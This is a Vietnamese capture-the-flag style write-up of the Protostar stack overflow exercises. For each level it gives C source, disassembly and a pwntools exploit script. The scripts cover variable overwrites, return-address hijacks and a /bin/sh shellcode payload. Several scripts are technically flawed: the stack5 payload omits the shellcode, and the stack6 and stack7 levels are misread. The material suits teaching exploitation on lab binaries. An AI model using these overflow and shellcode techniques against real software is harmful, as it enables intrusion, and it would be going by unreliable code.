# WriteUp
# PROTOSTAR EXPLOIT EXERCISE
## Stack 0 
Hãy cùng mở đầu với stackz3r0 nào các bạn ! Đề bài đã cung cấp cho chúng ta code C nên mọi thứ sẽ dễ hình dung hơn là mã ASM tuy nhiên chúng ta sẽ phân tích cả 2 nhé! 
Từ code C dưới đây, đề bài yêu cầu chúng ta thấy đề bài yêu cầu chúng ta thay đổi biến *modified* để in ra dòng *You changed the 'modified' variable* :
=> Nhìn từ code thì chúng ta sẽ có ý tưởng rằng nhập vào buffer bằng hàn gets và tràn sang modified.
```
/*gcc -o stack0 stackzero.c -fno-stack-protector -g -z execstack */

#include<stdlib.h>
#include<unistd.h>
#include<stdio.h>

int main(int argc, char **argv)
{
	volatile int modified;
	char buffer[64];

	modified = 0;
	gets(buffer);

	if(modified != 0 )
		printf("You changed the 'modified' variable \n");
	else
		printf("Try again?\n");
}
```
Mã ASM mà chúng ta disassemble từ gdb của file stack0 như sau : 
```
   0x0000000000400547 <+0>:	push   rbp
   0x0000000000400548 <+1>:	mov    rbp,rsp
   0x000000000040054b <+4>:	sub    rsp,0x60
   0x000000000040054f <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400552 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400556 <+15>:	mov    DWORD PTR [rbp-0x4],0x0
   0x000000000040055d <+22>:	lea    rax,[rbp-0x50]
   0x0000000000400561 <+26>:	mov    rdi,rax
   0x0000000000400564 <+29>:	mov    eax,0x0
   0x0000000000400569 <+34>:	call   0x400450 <gets@plt>
   0x000000000040056e <+39>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400571 <+42>:	test   eax,eax
   0x0000000000400573 <+44>:	je     0x400581 <main+58>
   0x0000000000400575 <+46>:	mov    edi,0x400628
   0x000000000040057a <+51>:	call   0x400430 <puts@plt>
   0x000000000040057f <+56>:	jmp    0x40058b <main+68>
   0x0000000000400581 <+58>:	mov    edi,0x40064d
   0x0000000000400586 <+63>:	call   0x400430 <puts@plt>
   0x000000000040058b <+68>:	mov    eax,0x0
   0x0000000000400590 <+73>:	leave  
   0x0000000000400591 <+74>:	ret   
```
Theo lý thuyết của buffer overflow thì chúng ta chỉ cần nhập byte vào cho tràn biến buffer và tràn sang modified là oke :< Vậy thì phải xác định được vị trí và kích thước của buffer và modified.
Dựa vào mã ASM ở trên chúng ta suy ra được :
[rbp-0x50] sẽ là địa chỉ của *buffer*
[rbp-0x4] sẽ là địa chỉ của *modified*
0x50 - 0x4 = 0x4c có nghĩa chỉ cần đè > 0x4c là có thể 

Mình dùng đoạn code sau để exploit bài này!
```
from pwn import *

BIN = "./stack0"
DEBUG = 1

gets = 0x0000000000400588
callback = 0x0000000000400575
def exploit():
  payload = b"A"*0x4c + b"B"
  # _breakpoint = """
  #     b *0x0000000000400588
  # """
  # gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
# context.log_level='debug'
exploit()
```

```
You changed the 'modified' variable
```
## Stack 1

LevelUp++ ! 
Cùng check code C đề cung cấp cho chúng ta như sau :
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("You have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
Chà chà , bài này về cơ chế cũng tương tự bài z3r0 thôi nhé ! Nhưng mà khác ở điểm phương thức nhập input sẽ khác và biến modified yêu cầu thành 1 giá trị xác định rõ ràng cụ thể là *modified = 0x61626364* và input sẽ nhập bằng argv[1] !
Cũng không có gì là quá khó vì chúng ta đã xác định được vị trí của 2 biến trên.
Có 1 điều cần lưu ý là đối với địa chỉ sẽ được ghi theo little edian, có nghĩa là byte nhỏ nhất sẽ nằm ở đầu tiền và byte lớn nhất lại nằm sau cùng ! Tuy nhiên chúng ta có hàm p64() từ thư viện pwntools sẽ giúp chúng ta phần đó 
p64() là vì chương trình này chúng ta complier nó ở hệ điều hành 64 bit, còn nếu 32 bit thì dùng p32().
```
from pwn import *

BIN = "./stack1"
DEBUG = 1

modified = 0x61626364
payload = b"A"*0x4c 
payload += p64(modified)


io = process(BIN)
io.sendline("./stack1 `python -c 'print(payload)'`")

io.interactive()
```
Và cứ thế chúng ta có được dòng :
```
You have correctly got the variable to the right value
```

## Stack 2

LevelUp++ ! Bây giờ lại sang 1 bài khác, đề bài vẫn cho mình 1 chương trình với code C như sau:


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
Bài này lại xuất hiện 1 hàm rất lạ *variable = getenv("GREENIE")* , lên gg dạo chơi thử xem thì ta biết được : https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm
Sau khi phân tích và tìm hiểu thì ta rút ra được kết luận là hàm getenv() đó sẽ gán giá trị của environment variable vào variable trong chương trình. 
Sau đó thì lại gán biến variable vào biến buffer, nguyên lý vẫn là thế chúng ta vẫn dựa vào buffer để tràn sang modified.
Đầu tiên sẽ tạo một environment variable có tên là GREENIE nằm trong cùng đường dẫn với sourcecó gí trị như sau:
```
export GREENIE=`python -c 'print( "A"*68+ "\x0a\x0d\x0a\x0d")
```
Để kiểm tra xem biến GREENIE đã nhận được giá trị mình gán vào hay chưa thì chúng ta có thể dùng câu lệnh sau: 

```
echo $GREENIE
```

Vào sau đó chúng ta chỉ cần chạy ./stack2 thôi !


```
you have correctly modified the variable
```
## Stack 3

LevelUp++!  Lên level này rồi thì độ khó cũng sẽ tăng theo thôi :3 
Level này sẽ giúp chúng ta hình dung về flow hoạt động của chương trình !

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
```
Dọc qua code C thì thấy bài yêu cầu chúng ta nhảy sang hàm *win* và in ra dòng *code flow successfully changed*
Về cơ chế thì chúng ta sẽ thay đổi flow hoạt động của chương trình, thay vì để chương trình nhập buffer rồi in ra dòng *calling ...* rồi kết thúc thì chúng ta phải nhảy đến hàm *win*, điểm lưu ý tiếp theo đó là *volatile int (*fp)()* đây là 1 con trỏ hàm. Có nghĩa là chúng ta sẽ nhảy đến địa chỉ mà con trỏ này trỏ tới!
Có nghĩa là chỉ cần đè lên pointer giá trị là địa chỉ của hàm win là được!
dùng gdb để tìm ra địa chỉ của hàm *win= 0x4005b6*.

Tương tự như câu trên chúng ta sẽ dùng p64() để chuyển địa chỉ về little edian rồi đưa vào payload.
```
from pwn import *

BIN = "./stack3"
DEBUG = 1

win = 0x4005b6

def exploit():

  payload = b"A"*0x48 + p64(win)  
  _breakpoint = """
      b *0x00000000004005ea
  """
  gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
context.log_level='debug'
exploit()
```

```
code flow successfully changed
```

## Stack 4
LevelUp++!  

Level này mà chúng ta có kiến thức về stack khá ổn thì nó cũng sẽ ezzz thôi! Vẫn là thay đổi flow của chương trình nhưng mà theo 1 cách khác !


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win() #
{
  printf("flag{u hereeee why u have to find ???}\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```


Như code C thì chúng ta chỉ thấy mỗi hàm gets(buffer), vậy thì nói 1 chút về cái flow của chương trình này nhé, để cho dễ thì chúng ta sẽ phân tích mã ASM :

```
   0x0000000000400577 <+0>:	push   rbp
   0x0000000000400578 <+1>:	mov    rbp,rsp
   0x000000000040057b <+4>:	sub    rsp,0x50
   0x000000000040057f <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x0000000000400582 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000400586 <+15>:	lea    rax,[rbp-0x40]
   0x000000000040058a <+19>:	mov    rdi,rax
   0x000000000040058d <+22>:	mov    eax,0x0
   0x0000000000400592 <+27>:	call   0x400450 <gets@plt>
   0x0000000000400597 <+32>:	mov    eax,0x0
   0x000000000040059c <+37>:	leave  
   0x000000000040059d <+38>:	ret    
```

Như chúng ta thấy, sau hàm get thì chúng ta sẽ có lần lượt các hàm có công dụng là trả về 0 cho eax, leave sẽ khôi phục lại stack trước khi thực thi hàm này, cụ thể là trả về giá trị cũ về rbp và rsp sau đó ret sẽ nhảy về địa chỉ trên đỉnh stack!

Điều đó có nghĩa là chúng ta sẽ cần đến 0x40 bytes để đè hết buffer, 0x8 bytes để đè old ebp ( cần 0x8 bytes bởi vì 64bit, 0x4 bytes với 32 bit), tiếp theo là địa chỉ hàm win, hàm mà chúng ta sẽ nhảy về!

Dựa vào đó chúng ta có exploit như sau !

```
from pwn import *

BIN = "./stack4"
DEBUG = 1

win = 0x400566

def exploit():

  payload = b"A"*0x48 + p64(win)
  
  _breakpoint = """
      b *0x0000000000400592
  """
  gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
context.log_level='debug'
exploit()
```
Flow của chương trình đã bị thay đổi !

```
flag{u hereeee why u have to find ???}
```


## Stack5

(((LevelUp++)++)++) !
Mình phải up như thế vì mình bị dừng ở phần này khá lâu ! Mình không biết tại sao mình lại bị dừng lại ở bài này lâu đến thế ! Chắc tại vì shellcode 😄

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
Code C này rất đơn thuần, chỉ có buffer và gets 🦀 ! Điều đó có nghĩa là chúng ta phải tìm ra 1 hướng mới! 

Như là Shellcode thần chưởng [1- Nhập môn],[2- Luyện Asm]
Các bạn hãy lên mạng search đọc nhé !

Sau cùng sau khi tìm hiểu thì flow hoạt động của shellcode như sau: Bạn cần ghi shellcode vào 1 địa chỉ nào đó sau đó return về đúng địa chỉ của shellcode thì đoạn shellcode đó sẽ được thực thi :vvvv

Nhìn về bài này có nghĩa là phải gọi 1 lệnh trùm ở system đó là *"/bin/sh"* thay vì ngồi code ASM lệnh này thì chúng ta có thể lên [Shellstorm](http://shell-storm.org/shellcode/) để chọn đoạn shellcode tương ứng với hệ điều hành mà mình đang dùng !

từ đó chúng ta có shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 

Từ đó viết ra 1 file exploit như sau : 

```
from pwn import *

BIN = "./stack5"
DEBUG = 1

buf = 0x7fffffffde10
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

def exploit():

  payload = b"A"*(0x48-len(shellcode)) + p64(buf)
  
  _breakpoint = """
      b *0x0000000000400522
  """
  gdb.attach(io, _breakpoint)
  io.sendline(payload)
  io.recv()
  io.interactive()


io = process(BIN)
context.log_level='debug'
exploit()
```


Boommmm


## Stack 6
LevelUp++!
Lên tới level này rồi thì có nghĩa là độ khó đã ghê lắm rồi :<  Nên sẽ có cái mới cho các bạn tìm hiểu ở phần code C của chương trình. 😆😆😆😆


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
Bài này thì lại xuất hiện 1 hàm mới đó là *`__builtin_return_address(0)`* lại dạo chơi trên gg xem chúng ta gặp cái gì đây nó thì ra lại hàm 1 hàm [return address](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html).  Hàm này đơn giản chỉ là trả về giá trị trở về của chương trình ứng với lớp được truyền vào. 

Trong trường hợp này, hàm này sẽ trả về giá trị trở về của getpath và gán nó vào biến ret . Và bài yêu cầu chúng ta phải gán được *ret = 0xbf000000* điều đó có nghĩa là hàm getpath phải trả về giá trị 0xbf000000
```
   0x0000000000400617 <+0>:	push   rbp
   0x0000000000400618 <+1>:	mov    rbp,rsp
   0x000000000040061b <+4>:	sub    rsp,0x50
   0x000000000040061f <+8>:	mov    edi,0x400744
   0x0000000000400624 <+13>:	mov    eax,0x0
   0x0000000000400629 <+18>:	call   0x4004f0 <printf@plt>
   0x000000000040062e <+23>:	mov    rax,QWORD PTR [rip+0x200a1b]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x0000000000400635 <+30>:	mov    rdi,rax
   0x0000000000400638 <+33>:	call   0x400520 <fflush@plt>
   0x000000000040063d <+38>:	lea    rax,[rbp-0x50]
   0x0000000000400641 <+42>:	mov    rdi,rax
   0x0000000000400644 <+45>:	mov    eax,0x0
   0x0000000000400649 <+50>:	call   0x400510 <gets@plt>
   0x000000000040064e <+55>:	mov    rax,QWORD PTR [rbp+0x8]
   0x0000000000400652 <+59>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400655 <+62>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400658 <+65>:	and    eax,0xbf000000
   0x000000000040065d <+70>:	cmp    eax,0xbf000000
   0x0000000000400662 <+75>:	jne    0x400682 <getpath+107>
   0x0000000000400664 <+77>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400667 <+80>:	mov    esi,eax
   0x0000000000400669 <+82>:	mov    edi,0x400758
   0x000000000040066e <+87>:	mov    eax,0x0
   0x0000000000400673 <+92>:	call   0x4004f0 <printf@plt>
   0x0000000000400678 <+97>:	mov    edi,0x1
   0x000000000040067d <+102>:	call   0x4004e0 <_exit@plt>
   0x0000000000400682 <+107>:	lea    rax,[rbp-0x50]
   0x0000000000400686 <+111>:	mov    rsi,rax
   0x0000000000400689 <+114>:	mov    edi,0x400764
   0x000000000040068e <+119>:	mov    eax,0x0
   0x0000000000400693 <+124>:	call   0x4004f0 <printf@plt>
   0x0000000000400698 <+129>:	nop
   0x0000000000400699 <+130>:	leave  
   0x000000000040069a <+131>:	ret    
```
Dựa vào code ASM thì chúng ta thấy buffer ở vị trí [rbp-0x50] có nghĩa là chúng ta sẽ dùng 0x50 bytes để đè lên buffer , sau đó là 0x8 bytes để đè lên old rbp và sau đó sẽ là giá trị mà chúng ta nhảy về là ret.

Mình viết một payload như sau:
```
from pwn import* 

BIN = "./stack6"
DEBUG = 1 

ret = 0xbf000000

def exploit():
	payload = b"A"*0x50 + b"B"*0x8 + p64(ret)

	_breakpoint = """
		0x0000000000400649
	"""
	gdb.attach(io,_breakpoint)
	io.sendline(payload)
	io.recv()
	io.interactive()


io = process(BIN)
context.log_level = 'debug'

exploit()
```

```
bzzzt (0xbf000000)
```


## Stack 7

LevelUp++!

Thậc là tuyệt vời ! 😆😆😆😆😆 đây là level cuối cùng trong chuỗi chall này rồi! Nên là chiến thôii


```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
Bài này không khác gì bài stack 6 cho lắm chỉ xuất hiện thêm hàm *strdup(buffer)* , nên là đi search gg lẹ lẹ ! Hàm [strdup](https://www.geeksforgeeks.org/strdup-strdndup-functions-c/) thực ra không ảnh hưởng gì lớn về việc exploit của mình! Nên là các bạn sẽ tự đọc thêm đi nhé bài này không có gì khó khăn, mình sẽ dùng luôn payload của bài stack 6 nhé !

```
from pwn import* 

BIN = "./stack7"
DEBUG = 1 

ret = 0xbf000000

def exploit():
	payload = b"A"*0x50 + b"B"*0x8 + p64(ret)

	_breakpoint = """
		0x0000000000400699
	"""
	gdb.attach(io,_breakpoint)
	io.sendline(payload)
	io.recv()
	io.interactive()


io = process(BIN)
context.log_level = 'debug'

exploit()

```
Done !



